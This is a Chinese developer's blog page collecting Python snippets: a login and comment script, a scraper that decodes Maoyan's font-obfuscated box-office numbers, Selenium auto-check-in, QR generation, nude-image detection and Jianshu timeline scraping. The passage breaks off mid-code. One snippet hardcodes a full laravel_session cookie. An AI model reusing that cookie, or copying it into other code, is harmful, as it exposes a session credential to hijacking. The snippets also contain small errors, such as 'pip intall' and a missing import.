<h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def login():</span><br><span class="line">    url = <span class="string">'http://119.29.27.100/apis/login'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: XXX,</span><br><span class="line">        <span class="string">'password'</span>: *******</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line">    responseData = response.json()</span><br><span class="line">    <span class="keyword">if</span> responseData[<span class="string">'status'</span>]==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'登录成功'</span>)</span><br><span class="line">        comment()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'登录失败'</span>, <span class="string">'失败原因：'</span>, responseData[<span class="string">'msg'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def comment():</span><br><span class="line">    url = <span class="string">'http://119.29.27.100/apis/message/add'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'这条应该是有登录的'</span>,</span><br><span class="line">        <span class="string">'ykname'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line">    responseData = response.json()</span><br><span class="line">    <span class="keyword">if</span> responseData[<span class="string">'status'</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'留言成功'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'留言失败'</span>, <span class="string">'失败原因：'</span>, responseData[<span class="string">'msg'</span>])</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 利用浏览器登录后得到的cookie，</span><br><span class="line">cookie_str = r<span class="string">'_myFavMv=%5B%5D; td_cookie=3034830472; laravel_session=eyJpdiI6Ik4wSjFSUU1wcFo1SndYRFliNWZZeXc9PSIsInZhbHVlIjoiMHJWZzM1WmpGRXp6NWVLYk9OaUdHOVVzcWRNK25lQ21lMFhIcmk4eUxKcEFMSnhwSDBMbTFyM3duUllqT3IycGRIc3V2TGhzWEdWaytWRkpzT3hNelE9PSIsIm1hYyI6ImNiMjRhMGFiYTIxYWJhMjUwZDJlNGI2ODgzY2ZiYzY4ZGY4NzI0MDQ4OGZkN2RiNGIwZGM2M2I2YmExYmY3OGIifQ%3D%3D'</span></span><br><span class="line"></span><br><span class="line">#把cookie字符串处理成字典，以便接下来使用</span><br><span class="line">cookies = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> cookie_str.split(<span class="string">';'</span>):</span><br><span class="line">    key, value = line.split(<span class="string">'='</span>, <span class="number">1</span>)</span><br><span class="line">    cookies[key] = value</span><br><span class="line"></span><br><span class="line">def comment():</span><br><span class="line">    url = <span class="string">'http://119.29.27.100/apis/message/add'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'再试一条cookie请求'</span>,</span><br><span class="line">        <span class="string">'ykname'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    responseData = response.json()</span><br><span class="line">    # print(responseData)</span><br><span class="line">    <span class="keyword">if</span> responseData[<span class="string">'status'</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'留言成功'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'留言失败'</span>, <span class="string">'失败原因：'</span>, responseData[<span class="string">'msg'</span>])</span><br><span class="line"></span><br><span class="line">comment()</span><br><span class="line">http:<span class="comment">//www.golang365.com/#/blog/54</span></span><br></pre></td></tr></table></figure>
<h3 id="猫眼票房"><a href="#猫眼票房" class="headerlink" title="猫眼票房"></a>猫眼票房</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">from</span> fontTools.ttLib <span class="keyword">import</span> TTFont</span><br><span class="line"></span><br><span class="line">font = TTFont(<span class="string">'font1.woff'</span>)</span><br><span class="line">uni_list = font.getGlyphOrder()[<span class="number">2</span>:]</span><br><span class="line">first_match = &#123;</span><br><span class="line">    <span class="string">'uniE893'</span>: <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'uniF690'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'uniF55C'</span>: <span class="string">'2'</span>,</span><br><span class="line">    <span class="string">'uniF28F'</span>: <span class="string">'3'</span>,</span><br><span class="line">    <span class="string">'uniF4B1'</span>: <span class="string">'4'</span>,</span><br><span class="line">    <span class="string">'uniE623'</span>: <span class="string">'5'</span>,</span><br><span class="line">    <span class="string">'uniF294'</span>: <span class="string">'6'</span>,</span><br><span class="line">    <span class="string">'uniEEC4'</span>: <span class="string">'7'</span>,</span><br><span class="line">    <span class="string">'uniE577'</span>: <span class="string">'8'</span>,</span><br><span class="line">    <span class="string">'uniE77B'</span>: <span class="string">'9'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def get_one_page(date):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: os.getenv(<span class="string">'User_Agent'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'https://piaofang.maoyan.com/?ver=normal&amp;date='</span> + date</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">    except RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Requests &#123;&#125;, Error &#123;&#125;."</span>.format(date, e.args))</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">def parse_font(html):</span><br><span class="line">    fonts = re.findall(r<span class="string">'base64,(.*?)\)'</span>, html, re.S)[<span class="number">0</span>]</span><br><span class="line">    # fonts = re.search(r'base64,(.*?)\)', html, re.S)</span><br><span class="line">    fonts = base64.b64decode(fonts)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'tmp.woff'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(fonts)</span><br><span class="line">    font1 = TTFont(<span class="string">'tmp.woff'</span>)</span><br><span class="line">    # obj_list1 = font1.getGlyphNames()[1:-1]</span><br><span class="line">    uni_list1 = font1.getGlyphOrder()[<span class="number">2</span>:]</span><br><span class="line">    tmp_match = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> uni1 <span class="keyword">in</span> uni_list1:</span><br><span class="line">        obj1 = font1['glyf'][uni1]  #获取编码 uni1 在 tmp.ttf 中对应的对象</span><br><span class="line">        <span class="keyword">for</span> uni <span class="keyword">in</span> uni_list:</span><br><span class="line">            obj = font[<span class="string">'glyf'</span>][uni]</span><br><span class="line">            <span class="keyword">if</span> obj==obj1:</span><br><span class="line">                tmp_match[uni1] = first_match[uni]</span><br><span class="line">    <span class="keyword">return</span> tmp_match</span><br><span class="line"></span><br><span class="line">def rebuild_number(number, tmp_match):</span><br><span class="line">    <span class="string">''</span><span class="string">'还需要对数字进行改写'</span><span class="string">''</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> number:</span><br><span class="line">        s = str(hex(ord(num)))</span><br><span class="line">        s = s.upper().replace(<span class="string">'0X'</span>, <span class="string">'uni'</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> tmp_match.keys():</span><br><span class="line">            result += tmp_match[s]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += num</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def parse_one_page(html):</span><br><span class="line">    tmp_match = parse_font(html)</span><br><span class="line">    doc = pq(html)</span><br><span class="line">    today = doc(<span class="string">'.today'</span>).text()[:<span class="number">10</span>]</span><br><span class="line">    movies = doc(<span class="string">'#ticket_tbody ul'</span>).items()</span><br><span class="line">    <span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'date'</span>] =  today</span><br><span class="line">        result[<span class="string">'movieName'</span>] = movie.find(<span class="string">'.c1 b'</span>).text()</span><br><span class="line">        result[<span class="string">'releaseInfo'</span>] = movie.find(<span class="string">'.c1 em'</span>).text().split()[<span class="number">0</span>]</span><br><span class="line">        result[<span class="string">'sumBoxInfo'</span>] = rebuild_number(movie.find(<span class="string">'.c1 em i'</span>).text(), tmp_match)</span><br><span class="line">        result[<span class="string">'boxInfo'</span>] =  rebuild_number(movie.find(<span class="string">'.c2'</span>).text(), tmp_match)</span><br><span class="line">        result[<span class="string">'boxRate'</span>] = rebuild_number(movie.find(<span class="string">'.c3'</span>).text(), tmp_match)</span><br><span class="line">        result[<span class="string">'showRate'</span>] = rebuild_number(movie.find(<span class="string">'.c4'</span>).text(), tmp_match)</span><br><span class="line">        result[<span class="string">'avgSeatView'</span>] = rebuild_number(movie.find(<span class="string">'.c5'</span>).text(), tmp_match)</span><br><span class="line">        <span class="keyword">yield</span> result</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start_date = datetime.date.today()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">31</span>):</span><br><span class="line">        date = start_date - datetime.timedelta(days=i)</span><br><span class="line">        html = get_one_page(date.isoformat())</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> parse_one_page(html):</span><br><span class="line">            print(result)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    https:<span class="comment">//learnku.com/articles/32534#reply104205</span></span><br></pre></td></tr></table></figure>
<h3 id="锟斤拷"><a href="#锟斤拷" class="headerlink" title="锟斤拷"></a>锟斤拷</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = (u<span class="string">'\uFFFD'</span>.encode(<span class="string">'utf8'</span>)*<span class="number">2</span>)</span><br><span class="line">&gt;&gt;&gt; print(s.decode(<span class="string">'gbk'</span>))</span><br><span class="line">锟斤拷</span><br><span class="line">当unicode遇到解释失败的字时，会尝试用 「U+FFFD」 来代替，「U+FFFD」乃是 unicode 的一个占位符， 显示为 �</span><br><span class="line">http:<span class="comment">//cuihuan.net/2019/05/12/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</span></span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pip intall nonude</span><br><span class="line"><span class="keyword">import</span> nude</span><br><span class="line">print(nude.is_nude(<span class="string">"godfather.jpg"</span>))</span><br><span class="line">print(nude.is_nude(<span class="string">"leisheng.jpg"</span>))</span><br><span class="line">print(nude.is_nude(<span class="string">"qiaoba.png"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> nude <span class="keyword">import</span> Nude</span><br><span class="line"></span><br><span class="line">images_format = ['jpg', 'png', 'gif']  # 图片格式</span><br><span class="line">images_jpg = glob.glob("E:/Images/OOXX/*.jpg")  # 返回匹配指定模式的文件名</span><br><span class="line">images_png = glob.glob(<span class="string">"E:/Images/OOXX/*.png"</span>)</span><br><span class="line">images_gif = glob.glob(<span class="string">"E:/Images/OOXX/*.gif"</span>)</span><br><span class="line"></span><br><span class="line">images_list = itertools.chain(images_jpg, images_png, images_gif)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> images_list:</span><br><span class="line">    print(i)  # 输出照片的路径</span><br><span class="line">    n = Nude(i)  # 对图片进行识别</span><br><span class="line">    n.parse()</span><br><span class="line">    print(n.result)  # 输出结果</span><br><span class="line">    print(n.message)  # 输出判断信息</span><br><span class="line">    print(n.inspect())  # 输出更加详细的判断信息</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">原文: https:<span class="comment">//lbjheiheihei.xyz/2018/05/14/Use-Python-Identifying-Porngraphic-Images.html</span></span><br></pre></td></tr></table></figure></p>
<h3 id="安装scrapy失败"><a href="#安装scrapy失败" class="headerlink" title="安装scrapy失败"></a>安装scrapy失败</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">依次安装lxml、pyOpenSSL、Twisted、pywin32 这些基本库都要安装好。</span><br><span class="line">    </span><br><span class="line">   pip install lxml</span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   如果不行，则去下面的网站下载。</span><br><span class="line">   </span><br><span class="line">   https:<span class="comment">//pypi.org/project/lxml/#files</span></span><br><span class="line">    https:<span class="comment">//www.lfd.uci.edu/~gohlke/pythonlibs/#lxml</span></span><br><span class="line">   比如我这台电脑是 Python3<span class="number">.6</span>，<span class="number">32</span>位的就下载 lxml<span class="number">-4.2</span><span class="number">.1</span>-cp36-cp36m-win32.whl 进入 cmd，然后 cd 到文件的路径下，接着就是</span><br><span class="line">   </span><br><span class="line">   pip install lxml<span class="number">-4.2</span><span class="number">.1</span>-cp36-cp36m-win32.whl</span><br><span class="line">    </span><br><span class="line">   命令后面那一部分要和文件名保持一致，也就是 pip install 文件名.whl回车，等一会就安装好了</span><br><span class="line">  pip install lxml</span><br><span class="line">  PythonCopy</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  如果不行，则去下面的网站下载。</span><br><span class="line">  </span><br><span class="line">  https:<span class="comment">//pypi.org/project/lxml/#files https://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml</span></span><br><span class="line">  比如我这台电脑是 Python3<span class="number">.6</span>，<span class="number">32</span>位的就下载 lxml<span class="number">-4.2</span><span class="number">.1</span>-cp36-cp36m-win32.whl 进入 cmd，然后 cd 到文件的路径下，接着就是</span><br><span class="line">  </span><br><span class="line">  pip install lxml<span class="number">-4.2</span><span class="number">.1</span>-cp36-cp36m-win32.whl</span><br><span class="line">  PythonCopy</span><br><span class="line">  命令后面那一部分要和文件名保持一致，也就是 pip install 文件名.whl回车，等一会就安装好了</span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">  原文: https:<span class="comment">//lbjheiheihei.xyz/2018/05/27/Install-Scrapy-In-Window.html</span></span><br></pre></td></tr></table></figure>
<h3 id="ChromeDriver"><a href="#ChromeDriver" class="headerlink" title="ChromeDriver"></a>ChromeDriver</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//sites.google.com/a/chromium.org/chromedriver/downloads http://phantomjs.org/</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument("--incognito")  # 隐身模式打开</span><br><span class="line">driver_path = "C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe"  # chromedriver.exe 的路径</span><br><span class="line">browser = webdriver.Chrome(executable_path=driver_path, options=options)</span><br><span class="line">browser.get("https://kejibear.xyz/auth/login")  # 网址</span><br><span class="line">browser.find_element_by_css_selector(".card-inner input[name='Email']").send_keys("@qq.com")  # 账号</span><br><span class="line">browser.find_element_by_css_selector(".card-inner input[name='Password']").send_keys("1")  # 密码</span><br><span class="line">browser.find_element_by_css_selector(<span class="string">".row .col-md-10.col-md-push-1 button.waves-effect"</span>).click()</span><br><span class="line">print(<span class="string">"登录成功~"</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.find_element_by_css_selector(<span class="string">".card-action-btn #checkin-btn button.waves-effect"</span>).click()</span><br><span class="line">print(<span class="string">"签到成功~"</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure>
<h3 id="生成彩色动态二维码"><a href="#生成彩色动态二维码" class="headerlink" title="生成彩色动态二维码"></a>生成彩色动态二维码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pip install myqr</span><br><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr</span><br><span class="line">version, level, qr_name = myqr.run(</span><br><span class="line">    words='dhb cdfb64%vjk',  # 不支持中文，支持 0~9,a~z, A~Z 以及常见的常用英文标点符号和空格</span><br><span class="line">    version=2,  # 版本，从 1至 40</span><br><span class="line">    level='H',  # 纠错等级，范围是L、M、Q、H，从左到右依次升高</span><br><span class="line">    picture='4e.jpg',  # 文件要放在目录下</span><br><span class="line">    colorized=True,   # True 为彩色，False 为黑白</span><br><span class="line">    contrast=1.0,  # 对比度</span><br><span class="line">    brightness=1.0,  # 亮度</span><br><span class="line">    save_name='1d6.bmp',  # 命名随便都行，格式可以是 jpg,png,bmp,gif</span><br><span class="line">    save_dir="F:\二维码"  # 路径要存在</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">myqr <span class="number">666</span> -p <span class="number">666.</span>png -c</span><br><span class="line">https:<span class="comment">//lbjheiheihei.xyz/2018/04/26/Use-Python-Generate-Colorful-QRcode.html</span></span><br></pre></td></tr></table></figure>
<h3 id="爬取简书用户的动态"><a href="#爬取简书用户的动态" class="headerlink" title="爬取简书用户的动态"></a>爬取简书用户的动态</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">my_header = <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=<span class="string">'https://www.jianshu.com/users/5aa8494a18c8/timeline'</span>, headers=&#123;<span class="string">'user-agent'</span>: my_header&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'大神带我来搬砖'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    print(<span class="string">'found'</span>)</span><br><span class="line">page = etree.HTML(res.text)</span><br><span class="line">last_li = page.xpath(<span class="string">''</span><span class="string">'//ul[@class="note-list"]/li[last()]'</span><span class="string">''</span>)[<span class="number">0</span>]</span><br><span class="line">max_id = int(last_li.get(<span class="string">'id'</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"activity.txt"</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">page = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    res = requests.get(url=<span class="string">'https://www.jianshu.com/users/5aa8494a18c8/timeline?max_id=%s&amp;page=%s'</span> %(max_id,page),</span><br><span class="line">        headers=&#123;<span class="string">'user-agent'</span>: my_header, <span class="string">'X-INFINITESCROLL'</span>:<span class="string">'true'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    last_li = etree.HTML(res.text).xpath(<span class="string">''</span><span class="string">'/html/body/li[last()]'</span><span class="string">''</span>)[<span class="number">0</span>]</span><br><span class="line">    max_id = int(last_li.get(<span class="string">'id'</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>]) - <span class="number">1</span></span><br><span class="line">    page = page + <span class="number">1</span></span><br><span class="line">    file.write(res.text)</span><br><span class="line">    file.write(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'加入了简书'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'end'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">file.close()</span><br><span class="line">#https://www.jianshu.com/p/35a85ee14f7b</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">prefs = &#123;<span class="string">"profile.managed_default_content_settings.images"</span>:<span class="number">2</span>&#125;</span><br><span class="line">options.add_experimental_option(<span class="string">"prefs"</span>,prefs)</span><br><span class="line">browser = webdriver.Chrome(chrome_options=options)</span><br><span class="line">browser.set_page_load_timeout(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">browser.get(<span class="string">"https://www.jianshu.com/users/5aa8494a18c8/timeline"</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"browser.txt"</span>,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span 